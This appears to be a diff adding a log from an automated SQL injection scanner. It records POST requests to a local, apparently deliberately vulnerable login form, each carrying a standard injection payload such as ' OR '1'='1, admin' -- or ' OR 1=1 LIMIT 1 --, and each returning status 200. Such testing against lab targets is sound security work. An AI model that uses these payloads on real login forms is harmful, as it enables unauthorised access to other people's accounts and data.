@@ -1,0 +1,69 @@
+2025-07-29 08:57:50,199 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,199 - INFO - Payload: "'"
+2025-07-29 08:57:50,199 - INFO - Inputs: {'username': "test'", 'password': "test'"}
+2025-07-29 08:57:50,199 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,203 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,204 - INFO - Payload: '"'
+2025-07-29 08:57:50,204 - INFO - Inputs: {'username': 'test"', 'password': 'test"'}
+2025-07-29 08:57:50,204 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,209 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,210 - INFO - Payload: '1=1'
+2025-07-29 08:57:50,210 - INFO - Inputs: {'username': 'test1=1', 'password': 'test1=1'}
+2025-07-29 08:57:50,210 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,222 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,222 - INFO - Payload: "' OR '1'='1"
+2025-07-29 08:57:50,222 - INFO - Inputs: {'username': "test' OR '1'='1", 'password': "test' OR '1'='1"}
+2025-07-29 08:57:50,222 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,231 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,232 - INFO - Payload: "' OR 1=1--"
+2025-07-29 08:57:50,232 - INFO - Inputs: {'username': "test' OR 1=1--", 'password': "test' OR 1=1--"}
+2025-07-29 08:57:50,232 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,236 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,236 - INFO - Payload: "'--"
+2025-07-29 08:57:50,236 - INFO - Inputs: {'username': "test'--", 'password': "test'--"}
+2025-07-29 08:57:50,236 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,242 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,242 - INFO - Payload: "'#"
+2025-07-29 08:57:50,242 - INFO - Inputs: {'username': "test'#", 'password': "test'#"}
+2025-07-29 08:57:50,242 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,247 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,247 - INFO - Payload: '"#'
+2025-07-29 08:57:50,247 - INFO - Inputs: {'username': 'test"#', 'password': 'test"#'}
+2025-07-29 08:57:50,247 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,251 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,252 - INFO - Payload: "admin' --"
+2025-07-29 08:57:50,252 - INFO - Inputs: {'username': "testadmin' --", 'password': "testadmin' --"}
+2025-07-29 08:57:50,252 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,258 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,258 - INFO - Payload: "admin' #"
+2025-07-29 08:57:50,258 - INFO - Inputs: {'username': "testadmin' #", 'password': "testadmin' #"}
+2025-07-29 08:57:50,258 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,267 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,267 - INFO - Payload: "' OR '1'='1' --"
+2025-07-29 08:57:50,267 - INFO - Inputs: {'username': "test' OR '1'='1' --", 'password': "test' OR '1'='1' --"}
+2025-07-29 08:57:50,267 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,273 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,273 - INFO - Payload: "' OR 1=1#"
+2025-07-29 08:57:50,273 - INFO - Inputs: {'username': "test' OR 1=1#", 'password': "test' OR 1=1#"}
+2025-07-29 08:57:50,273 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,281 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,281 - INFO - Payload: "' OR 'a'='a"
+2025-07-29 08:57:50,281 - INFO - Inputs: {'username': "test' OR 'a'='a", 'password': "test' OR 'a'='a"}
+2025-07-29 08:57:50,281 - INFO - Status Code: 200
+
+2025-07-29 08:57:50,291 - INFO - Form #1 - POST http://localhost:5000/vulnerable_login
+2025-07-29 08:57:50,291 - INFO - Payload: "' OR 1=1 LIMIT 1 --"
+2025-07-29 08:57:50,291 - INFO - Inputs: {'username': "test' OR 1=1 LIMIT 1 --", 'password': "test' OR 1=1 LIMIT 1 --"}
+2025-07-29 08:57:50,291 - INFO - Status Code: 200
